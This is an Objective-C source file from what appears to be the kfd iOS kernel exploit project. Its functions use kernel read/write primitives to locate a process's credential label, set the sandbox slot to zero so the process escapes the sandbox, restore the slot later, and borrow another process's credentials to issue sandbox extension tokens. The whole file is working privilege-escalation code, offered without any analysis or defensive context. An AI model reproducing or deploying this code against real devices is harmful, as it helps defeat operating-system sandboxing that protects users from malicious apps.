//
//  sandbox.m
//  kfd
//
//  Created by Seo Hyun-gyu on 2023/08/19.
//

#import <Foundation/Foundation.h>
#import <stdbool.h>
#import "offsets.h"
#import "krw.h"
#import "sandbox.h"
#import "proc.h"
#import "escalate.h"
#import "stage2.h"


uint64_t unsandbox(pid_t pid) {
    printf("[*] Unsandboxing pid %d\n", pid);
    
    //uint64_t proc = proc_of_pid(pid); // pid's proccess structure on the kernel
    //uint64_t ucred = kread64(proc + off_p_ucred); // pid credentials
    uint64_t proc = mineek_find_port(getpid());
    uint64_t ucred = find_ucred(proc);
    uint64_t cr_label = kread64(ucred + off_u_cr_label); // MAC label
    uint64_t orig_sb = kread64(cr_label + off_sandbox_slot);
    
    kwrite64(cr_label + off_sandbox_slot /* First slot is AMFI's. so, this is second? */, 0); //get rid of sandbox by nullifying it
    
    return (kread64(kread64(ucred + off_u_cr_label) + off_sandbox_slot) == 0) ? orig_sb : NO;
}

BOOL sandbox(pid_t pid, uint64_t sb) {
    if (!pid) return NO;
    
    printf("[*] Sandboxing pid %d with slot at 0x%llx\n", pid, sb);
    
    //uint64_t proc = proc_of_pid(pid); // pid's proccess structure on the kernel
    //uint64_t ucred = kread64(proc + off_p_ucred); // pid credentials
    uint64_t proc = mineek_find_port(getpid());
    uint64_t ucred = find_ucred(proc);
    uint64_t cr_label = kread64(ucred + off_u_cr_label); /* MAC label */
    kwrite64(cr_label + off_sandbox_slot /* First slot is AMFI's. so, this is second? */, sb);
    
    return (kread64(kread64(ucred + off_u_cr_label) + off_sandbox_slot) == sb) ? YES : NO;
}

char* token_by_sandbox_extension_issue_file(const char *extension_class, const char *path, uint32_t flags) {
    uint64_t self_ucreds = borrow_ucreds(getpid(), 1);
    char *ret = sandbox_extension_issue_file(extension_class, path, flags);
    unborrow_ucreds(getpid(), self_ucreds);
    
    return ret;
}
